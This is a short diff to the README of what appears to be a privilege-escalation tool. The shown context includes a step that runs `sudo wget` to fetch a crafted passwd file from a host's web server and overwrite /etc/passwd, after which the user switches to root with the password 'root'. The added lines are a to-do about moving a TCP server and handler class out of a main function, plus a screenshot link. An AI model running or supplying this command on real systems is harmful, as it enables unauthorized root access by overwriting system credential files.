@@ -14,4 +14,7 @@ Run the command `sudo wget http://<host ip>:<webserver port>/passwd -O /etc/pass
 **Congratulations!** 
 Now switch users to `root` with the password `root`
 
+# Updates
+* [ ] Make the code cleaner by moving the TCP Server and custom Handler Class outside the main function
+
 ![showcase](https://i.imgur.com/1bVzFk8.png)
